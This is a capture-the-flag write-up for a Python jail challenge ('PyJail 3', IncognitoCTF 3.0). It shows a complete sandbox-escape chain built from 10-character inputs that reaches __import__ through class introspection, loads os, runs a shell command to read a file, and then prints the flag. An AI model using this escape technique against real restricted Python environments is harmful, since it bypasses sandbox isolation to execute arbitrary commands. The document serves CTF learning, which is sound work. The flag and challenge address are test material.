# IncognitoCTF 3.0 - PyJail 3

#### about : 
- Type: jail 
- Level: meduim 
- Points : 100
- link : nc 142.93.209.130 9843

Same substitution problem, but we have also another problem: we are limited to input string of 10 character max.

It's a little bit annoying, but I split the exploit in several parts:

Final chain: 
`
g=getattr
f=flag
a='_._'
a+='cla'
a+='ss'
a+='_._'
x=g(f,a)
a='_._'
a+='bas'
a+='e'
a+='_._'
x=g(x,a)
a='_._'
a+='sub'
a+='cla'
a+='sse'
a+='s'
a+='_._'
x=g(x,a)
x=x()[196]
x=x()
a='_mo'
a+='dul'
a+='e'
x=g(x,a)
a='_._'
a+='bui'
a+='lti'
a+='ns'
a+='_._'
x=g(x,a)
a='_._'
a+='imp'
a+='ort'
a+='_._'
x=x[a]
x=x('os')
a='sys'
a+='tem'
x=g(x,a)
a='cat'
a+=' ja'
a+='il3'
x(a)
`

Flag: `ictf{C0ngr4t3_y0u_D1d_3m_4ll_457504214}`
